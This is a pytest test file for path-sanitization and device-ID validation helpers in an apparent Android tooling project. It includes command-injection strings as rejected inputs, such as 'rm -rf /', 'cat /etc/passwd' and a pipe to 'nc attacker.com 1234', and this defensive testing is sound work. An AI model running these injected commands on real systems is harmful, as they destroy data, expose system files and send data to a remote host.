"""
Tests for security utilities - input sanitization and validation.
"""

import os
import pytest
from src.utils.security_utils import (
    sanitize_path_component,
    sanitize_android_path,
    sanitize_local_path,
    validate_device_id,
)


class TestSanitizePathComponent:
    """Tests for sanitize_path_component function."""

    def test_valid_component(self):
        """Test that valid path components are accepted."""
        assert sanitize_path_component("file.txt") == "file.txt"
        assert sanitize_path_component("folder") == "folder"
        assert sanitize_path_component("my_file-2.txt") == "my_file-2.txt"

    def test_empty_component(self):
        """Test that empty components are rejected."""
        with pytest.raises(ValueError, match="Path component cannot be empty"):
            sanitize_path_component("")

    def test_dangerous_chars(self):
        """Test that dangerous characters are rejected."""
        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '>', '<', '(', ')']
        for char in dangerous_chars:
            with pytest.raises(ValueError, match="dangerous character"):
                sanitize_path_component(f"file{char}name.txt")

    def test_command_substitution(self):
        """Test that command substitution patterns are rejected."""
        with pytest.raises(ValueError, match="dangerous character"):
            sanitize_path_component("file$(whoami).txt")
        with pytest.raises(ValueError, match="dangerous character"):
            sanitize_path_component("file${USER}.txt")

    def test_null_byte(self):
        """Test that null bytes are rejected."""
        with pytest.raises(ValueError, match="null byte"):
            sanitize_path_component("file\x00name.txt")


class TestSanitizeAndroidPath:
    """Tests for sanitize_android_path function."""

    def test_valid_absolute_path(self):
        """Test that valid absolute paths are accepted."""
        assert sanitize_android_path("/sdcard/Download") == "/sdcard/Download"
        assert sanitize_android_path("/data/local/tmp") == "/data/local/tmp"

    def test_valid_relative_path(self):
        """Test that valid relative paths are accepted."""
        assert sanitize_android_path("./folder/file.txt") == "./folder/file.txt"

    def test_path_with_spaces(self):
        """Test that paths with spaces are allowed."""
        assert sanitize_android_path("/sdcard/My Photos/vacation.jpg") == "/sdcard/My Photos/vacation.jpg"
        assert sanitize_android_path("/sdcard/DCIM/Camera Roll/IMG_001.jpg") == "/sdcard/DCIM/Camera Roll/IMG_001.jpg"

    def test_empty_path(self):
        """Test that empty paths are rejected."""
        with pytest.raises(ValueError, match="Path cannot be empty"):
            sanitize_android_path("")

    def test_null_byte(self):
        """Test that null bytes are rejected."""
        with pytest.raises(ValueError, match="null byte"):
            sanitize_android_path("/sdcard/file\x00.txt")

    def test_command_injection_semicolon(self):
        """Test that semicolon command injection is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/file; rm -rf /")

    def test_command_injection_pipe(self):
        """Test that pipe command injection is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/file | cat /etc/passwd")

    def test_command_injection_ampersand(self):
        """Test that ampersand command injection is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/file && malicious")

    def test_command_substitution(self):
        """Test that command substitution is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/$(whoami)")
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/${USER}")

    def test_backtick_substitution(self):
        """Test that backtick command substitution is blocked."""
        with pytest.raises(ValueError, match="dangerous pattern"):
            sanitize_android_path("/sdcard/`whoami`")


class TestSanitizeLocalPath:
    """Tests for sanitize_local_path function."""

    def test_valid_absolute_path(self):
        """Test that valid absolute paths are normalized."""
        result = sanitize_local_path("/tmp/test")
        assert os.path.isabs(result)

    def test_empty_path(self):
        """Test that empty paths are rejected."""
        with pytest.raises(ValueError, match="Path cannot be empty"):
            sanitize_local_path("")

    def test_null_byte(self):
        """Test that null bytes are rejected."""
        with pytest.raises(ValueError, match="null byte"):
            sanitize_local_path("/tmp/file\x00.txt")

    def test_path_traversal_with_base_dir(self):
        """Test that path traversal outside base_dir is blocked."""
        base = "/tmp/safe"
        with pytest.raises(ValueError, match="outside base directory"):
            sanitize_local_path("/tmp/unsafe", base_dir=base)

    def test_valid_path_within_base_dir(self):
        """Test that paths within base_dir are accepted."""
        base = "/tmp/safe"
        result = sanitize_local_path("/tmp/safe/subdir", base_dir=base)
        # result is an absolute path, so we need to compare absolute versions
        base_abs = os.path.abspath(base)
        assert result.startswith(base_abs)

    def test_path_normalization(self):
        """Test that paths with .. are normalized."""
        result = sanitize_local_path("/tmp/test/../other")
        assert ".." not in result


class TestValidateDeviceId:
    """Tests for validate_device_id function."""

    def test_valid_device_id(self):
        """Test that valid device IDs are accepted."""
        assert validate_device_id("ABC123") == "ABC123"
        assert validate_device_id("192.168.1.1:5555") == "192.168.1.1:5555"
        assert validate_device_id("emulator-5554") == "emulator-5554"

    def test_empty_device_id(self):
        """Test that empty device IDs are rejected."""
        with pytest.raises(ValueError, match="Device ID cannot be empty"):
            validate_device_id("")

    def test_invalid_characters(self):
        """Test that invalid characters are rejected."""
        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', ' ', '>', '<']
        for char in dangerous_chars:
            with pytest.raises(ValueError):
                validate_device_id(f"device{char}123")


class TestSecurityIntegration:
    """Integration tests for security utilities."""

    def test_prevent_command_injection_in_path(self):
        """Test that common command injection attempts are blocked."""
        malicious_paths = [
            "/sdcard/file; rm -rf /",
            "/sdcard/file && cat /etc/passwd",
            "/sdcard/file | nc attacker.com 1234",
            "/sdcard/$(malicious_command)",
            "/sdcard/`whoami`",
            "/sdcard/file\nmalicious_command",
        ]
        for path in malicious_paths:
            with pytest.raises(ValueError):
                sanitize_android_path(path)

    def test_prevent_path_traversal(self):
        """Test that path traversal attempts are detected."""
        base = "/tmp/restricted"
        with pytest.raises(ValueError):
            sanitize_local_path("/etc/passwd", base_dir=base)

    def test_symlink_attack_prevention(self):
        """Test that symlink-based path traversal is blocked."""
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a base directory
            base_dir = os.path.join(tmpdir, "safe")
            os.makedirs(base_dir)

            # Create a directory outside the base
            outside_dir = os.path.join(tmpdir, "outside")
            os.makedirs(outside_dir)

            # Create a symlink inside the base that points outside
            symlink_path = os.path.join(base_dir, "escape")
            os.symlink(outside_dir, symlink_path)

            # Attempt to use the symlink should fail base_dir validation
            with pytest.raises(ValueError, match="outside base directory"):
                sanitize_local_path(symlink_path, base_dir=base_dir)


class TestUnicodeAndEdgeCases:
    """Tests for Unicode characters, long paths, and cross-platform handling."""

    def test_unicode_characters_in_android_path(self):
        """Test that Unicode characters are accepted in Android paths."""
        # Common Unicode characters in filenames
        unicode_paths = [
            "/sdcard/照片/vacation.jpg",  # Chinese
            "/sdcard/Фото/image.png",  # Russian
            "/sdcard/صور/photo.jpg",  # Arabic
            "/sdcard/🎉/emoji.txt",  # Emoji
            "/sdcard/Ménü/file.txt",  # Accented characters
        ]
        for path in unicode_paths:
            result = sanitize_android_path(path)
            assert result == path

    def test_unicode_characters_in_path_component(self):
        """Test that Unicode characters are accepted in path components."""
        unicode_components = [
            "文件.txt",  # Chinese
            "файл.doc",  # Russian
            "ملف.pdf",  # Arabic
            "archivo_español.txt",  # Spanish
        ]
        for component in unicode_components:
            result = sanitize_path_component(component)
            assert result == component

    def test_very_long_android_path(self):
        """Test that very long paths are handled correctly."""
        # Create a path with many nested directories
        long_path = "/sdcard/" + "/".join([f"dir{i}" for i in range(100)]) + "/file.txt"
        result = sanitize_android_path(long_path)
        assert result == long_path

    def test_very_long_path_component(self):
        """Test that very long path components are accepted."""
        # Android typically supports filenames up to 255 characters
        long_component = "a" * 255
        result = sanitize_path_component(long_component)
        assert result == long_component

    def test_extremely_long_path_component(self):
        """Test that extremely long path components are accepted."""
        # Test a 1000 character filename
        very_long_component = "x" * 1000
        result = sanitize_path_component(very_long_component)
        assert result == very_long_component

    def test_local_path_windows_style(self):
        """Test that Windows-style paths are normalized correctly."""
        import platform
        if platform.system() == "Windows":
            # Windows paths should be normalized
            result = sanitize_local_path("C:\\Users\\Test\\Documents")
            assert os.path.isabs(result)
            assert "\\" in result or "/" in result  # May be normalized

    def test_local_path_unix_style(self):
        """Test that Unix-style paths are normalized correctly."""
        result = sanitize_local_path("/tmp/test/file.txt")
        assert os.path.isabs(result)

    def test_local_path_with_mixed_separators(self):
        """Test that paths with mixed separators are normalized."""
        import platform
        if platform.system() == "Windows":
            # Windows should handle mixed separators
            mixed_path = "C:/Users\\Test/Documents"
            result = sanitize_local_path(mixed_path)
            assert os.path.isabs(result)

    def test_android_path_with_spaces_and_unicode(self):
        """Test paths with both spaces and Unicode characters."""
        path = "/sdcard/My Photos 照片/vacation 2023.jpg"
        result = sanitize_android_path(path)
        assert result == path

    def test_device_id_with_port_number(self):
        """Test device IDs with port numbers (emulators and network devices)."""
        device_ids = [
            "192.168.1.100:5555",
            "10.0.2.15:5037",
            "emulator-5554",
            "emulator-5556",
        ]
        for device_id in device_ids:
            result = validate_device_id(device_id)
            assert result == device_id

    def test_device_id_serial_numbers(self):
        """Test various device serial number formats."""
        device_ids = [
            "ABC123DEF456",
            "ZX1G427QK9",
            "R5CR40CPDXD",
            "ce12160c1a2d0b1f01",
        ]
        for device_id in device_ids:
            result = validate_device_id(device_id)
            assert result == device_id

    def test_path_component_with_dots(self):
        """Test that legitimate dots in filenames are allowed."""
        components = [
            "file.name.with.dots.txt",
            "archive.tar.gz",
            ".hidden",
            "..hidden_but_safe",  # Double dot NOT used for traversal
        ]
        for component in components:
            result = sanitize_path_component(component)
            assert result == component

    def test_android_path_normalization_preserves_intent(self):
        """Test that path normalization preserves the original intent."""
        paths = [
            "/sdcard/DCIM/Camera",
            "/data/local/tmp",
            "/storage/emulated/0/Download",
            "./relative/path/file.txt",
        ]
        for path in paths:
            result = sanitize_android_path(path)
            # Should preserve the original path structure
            assert result == path
